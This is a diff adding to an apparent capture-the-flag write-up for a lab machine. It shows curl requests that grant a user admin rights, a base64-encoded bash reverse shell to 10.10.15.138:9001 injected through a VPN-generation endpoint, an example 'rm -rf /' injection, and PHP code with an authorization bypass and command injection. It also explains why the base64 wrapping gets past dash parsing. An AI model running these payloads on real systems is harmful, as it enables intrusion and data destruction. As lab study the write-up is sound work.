@@ -232,6 +232,408 @@ ayux@pop-os:~$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2mi
 {"id":13,"username":"z3nshell","is_admin":1}[ble: EOF]
 ```
 
+RCE
 
+```
+$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/settings/update -s -X PUT -H "Content-Type: application/json" -d '{"email": "z3nshell@mail.io", "is_admin": 1}'
+{"id":13,"username":"z3nshell","is_admin":1}[ble: EOF]
+
+$ echo "bash -i >& /dev/tcp/10.10.15.138/9001 0>&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzgvOTAwMSAwPiYxCg==
+
+$ curl -H "Cookie: PHPSESSID=96u52drg1tebmubh0j6p7gbc2u" http://2million.htb/api/v1/admin/vpn/generate -X POST -H "Content-Type: application/json" -d '{"username": "admin;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzgvOTAwMSAwPiYxCg== | base64 -d | bash;"}'
+```
+
+# Backend code vulnerablities:
+
+## 1. Auth Bypass
+
+```php
+<?php
+class AdminController
+{
+    public function is_admin($router)
+    {
+        if (!isset($_SESSION) || !isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true || !isset($_SESSION['username'])) {
+            return header("HTTP/1.1 401 Unauthorized");
+            exit;
+        }
+
+        $db = Database::getDatabase();
+
+        $stmt = $db->query('SELECT is_admin FROM users WHERE username = ?', ['s' => [$_SESSION['username']]]);
+        $user = $stmt->fetch_assoc();
+
+        if ($user['is_admin'] == 1) {
+            header('Content-Type: application/json');
+            return json_encode(['message' => TRUE]);
+        } else {
+            header('Content-Type: application/json');
+            return json_encode(['message' => FALSE]);
+        }
+    }
+
+    public function update_settings($router) {
+        $db = Database::getDatabase();
+
+        $is_admin = $this->is_admin($router);
+        if (!$is_admin) {
+            return header("HTTP/1.1 401 Unauthorized");
+            exit;
+        }
+
+        if (!isset($_SERVER['CONTENT_TYPE']) || $_SERVER['CONTENT_TYPE'] !== 'application/json') {
+            return json_encode([
+                'status' => 'danger',
+                'message' => 'Invalid content type.'
+            ]);
+            exit;
+        }
+
+        $body = file_get_contents('php://input');
+        $json = json_decode($body);
+
+        if (!isset($json->email)) {
+            return json_encode([
+                'status' => 'danger',
+                'message' => 'Missing parameter: email'
+            ]);
+            exit;
+        }
+
+        if (!isset($json->is_admin)) {
+            return json_encode([
+                'status' => 'danger',
+                'message' => 'Missing parameter: is_admin'
+            ]);
+            exit;
+        }
+
+        $email = $json->email;
+        $is_admin = $json->is_admin;
+
+        if ($is_admin !== 1 && $is_admin !== 0) {
+            return json_encode([
+                'status' => 'danger',
+                'message' => 'Variable is_admin needs to be either 0 or 1.'
+            ]);
+            exit;
+        }
+
+        $stmt = $db->query('SELECT * FROM users WHERE email = ?', ['s' => [$email]]);
+        $user = $stmt->fetch_assoc();
+
+        if ($user) {
+            $stmt = $db->query('UPDATE users SET is_admin = ? WHERE email = ?', ['s' => [$is_admin, $email]]);
+        } else {
+            return json_encode([
+                'status' => 'danger',
+                'message' => 'Email not found.'
+            ]);
+            exit;
+        }
+
+        if ($user['username'] == $_SESSION['username'] ) {
+            $_SESSION['is_admin'] = $is_admin;
+        }
+
+        return json_encode(['id' => $user['id'], 'username' => $user['username'], 'is_admin' => $is_admin]);
+    }
+}
+```
+
+code to check is_admin:
+
+```php
+$is_admin = $this->is_admin($router);
+if (!$is_admin) {
+    return header("HTTP/1.1 401 Unauthorized");
+}
+```
+
+However, `is_admin()` returns:
+
+* `json_encode(['message' => TRUE])`
+* `json_encode(['message' => FALSE])`
+* OR sets a header and exits
+
+That means it returns a **string**, not a boolean.
+
+In PHP:
+
+```php
+if (!"{"message":false}") {
+```
+
+Any non-empty string evaluates to **true**.
+
+So:
+
+* Even if the user is NOT admin,
+* `is_admin()` returns `"{"message":false}"`
+* That is truthy
+* `!$is_admin` becomes `false`
+* Authorization check is bypassed
+
+This allows non-admin users to call update_settings().
+
+## 2. RCE
+
+```php
+<?php
+class VPNController
+{
+    private function remove_special_chars($string) {
+        $string = str_replace(' ', '-', $string);
+        $string = preg_replace('/[^A-Za-z0-9\-]/', '', $string);
+
+        return $string;
+    }
+
+    private function download_vpn($fileName) 
+    {
+        // Define the allowed directory
+        $allowedDir = realpath('/var/www/html/VPN/user');
+        // Remove any path info from filename (for security)
+        $fileName = basename($fileName);
+        // Join the allowed directory with the filename
+        $filePath = $allowedDir . '/' . $fileName;
+        // Resolve to an absolute path
+        $realPath = realpath($filePath);
+
+        // Check if the file is in the allowed directory
+        if ($realPath === false || strpos($realPath, $allowedDir) !== 0) {
+            // File is not in the allowed directory
+            header("HTTP/1.0 404 Not Found");
+            die;
+        }
+
+        // Check if the file exists and is readable
+        if (file_exists($filePath) && is_readable($filePath)) {
+            // Send headers to prompt download
+            header('Content-Description: File Transfer');
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
+            header('Expires: 0');
+            header('Cache-Control: must-revalidate');
+            header('Pragma: public');
+            header('Content-Length: ' . filesize($filePath));
+            flush(); // Flush system output buffer
+            readfile($filePath);
+            exit;
+        } else {
+            header("HTTP/1.0 404 Not Found");
+        }
+    }
+
+    public function generate_user_vpn($router) {
+        if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+            return header("HTTP/1.1 401 Unauthorized");
+            exit;
+        }
+        if (!isset($_SESSION['username']) || $_SESSION['username'] == null) {
+            return header("HTTP/1.1 401 Unauthorized");
+            exit;
+        }
+
+        $username = $this->remove_special_chars($_SESSION['username']);
+        $fileName = $username . ".ovpn";
+
+        if (file_exists("VPN/user/" . $fileName) && is_readable("VPN/user/" . $fileName)) {
+            $this->download_vpn($fileName);
+        } else {
+            $this->regenerate_user_vpn($router);
+        }
+    }
+
+    public function regenerate_user_vpn($router, $user = null) {
+        if ($user != null) {
+            exec("/bin/bash /var/www/html/VPN/gen.sh $user", $output, $return_var);
+        } else {
+            if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+                return header("HTTP/1.1 401 Unauthorized");
+                exit;
+            }
+            if (!isset($_SESSION['username']) || $_SESSION['username'] == null) {
+                return header("HTTP/1.1 401 Unauthorized");
+                exit;
+            }
+
+            $username = $this->remove_special_chars($_SESSION['username']);
+            $fileName = $username. ".ovpn";
+
+            exec("/bin/bash /var/www/html/VPN/gen.sh $username", $output, $return_var);
+
+            $this->download_vpn($fileName);
+        }
+    }
+
+    public function admin_vpn($router) {
+        if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
+            return header("HTTP/1.1 401 Unauthorized");
+            exit;
+        }
+        if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== 1) {
+            return header("HTTP/1.1 401 Unauthorized");
+            exit;
+        }
+        if (!isset($_SERVER['CONTENT_TYPE']) || $_SERVER['CONTENT_TYPE'] !== 'application/json') {
+            return json_encode([
+                'status' => 'danger',
+                'message' => 'Invalid content type.'
+            ]);
+            exit;
+        }
+
+        $body = file_get_contents('php://input');
+        $json = json_decode($body);
+
+        if (!isset($json)) {
+            return json_encode([
+                'status' => 'danger',
+                'message' => 'Missing parameter: username'
+            ]);
+            exit;
+        }
+        if (!$json->username) {
+            return json_encode([
+                'status' => 'danger',
+                    'message' => 'Missing parameter: username'
+            ]);
+            exit;
+        }
+        $username = $json->username;
+
+        $this->regenerate_user_vpn($router, $username);
+        $output = shell_exec("/usr/bin/cat /var/www/html/VPN/user/$username.ovpn");
+
+        return is_array($output) ? implode("<br>", $output) : $output;
+    }
+}
+```
+
+In `admin_vpn()`:
+
+```php
+$username = $json->username;
+$this->regenerate_user_vpn($router, $username);
+```
+
+No sanitization is applied to `$username`.
+An attacker (admin or compromised admin account) can inject commands:
+
+```json
+{
+  "username": "john; rm -rf /"
+}
+```
+
+This becomes:
+
+```bash
+/bin/bash /var/www/html/VPN/gen.sh john; rm -rf /
+```
+
+
+
+<details>
+  <summary>Why earlier payload didn't work</summary>
+  When we send:
+
+```json
+{
+  "username": "admin;bash -i >& /dev/tcp/10.10.15.138/9001 0>&1;"
+}
+```
+
+The actual command becomes:
+
+```bash
+/bin/bash /var/www/html/VPN/gen.sh admin;bash -i >& /dev/tcp/10.10.15.138/9001 0>&1;
+```
+
+So now we need to understand how this is executed internally.
+
+How PHP `exec()` Runs Commands: Internally, PHP executes something equivalent to:
+
+```
+/bin/sh -c "<your command>"
+```
+
+Even though you're calling `/bin/bash`, **the entire string is first parsed by `/bin/sh`**. now the payload
+
+```
+bash -i >& /dev/tcp/10.10.15.138/9001 0>&1
+```
+
+The operator:
+
+```
+>&
+```
+
+is **Bash-specific syntax**.
+
+But `/bin/sh` on many systems (especially Debian/Ubuntu) is:
+
+```
+dash
+```
+
+And `dash` does NOT support:
+
+```
+>&
+```
+
+So when `/bin/sh -c` parses your injected command, it errors before Bash even runs it.
+
+Result:
+
+* Syntax error
+* Reverse shell never executes
+
+which is a **shell parsing issue**, not a filtering issue.
+
+working payload:
+
+```json
+{
+  "username": "admin;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzgvOTAwMSAwPiYxCg== | base64 -d | bash;"
+}
+```
+
+This becomes:
+
+```bash
+/bin/bash /var/www/html/VPN/gen.sh admin;
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzgvOTAwMSAwPiYxCg== | base64 -d | bash;
+```
+
+Now look carefully:
+
+There are **no special redirection operators in the injected command itself**.
+
+The shell only sees:
+
+```
+echo <base64> | base64 -d | bash
+```
+
+That is fully POSIX-compliant and works in `/bin/sh`.
+
+Then:
+
+1. `echo` outputs base64
+2. `base64 -d` decodes it
+3. `bash` executes the decoded content
+4. Now Bash interprets:
+
+   ```
+   bash -i >& /dev/tcp/10.10.15.138/9001 0>&1
+   ```
+
+   which works because it's now being parsed by **bash**, not `/bin/sh`.
+</details>
 
 
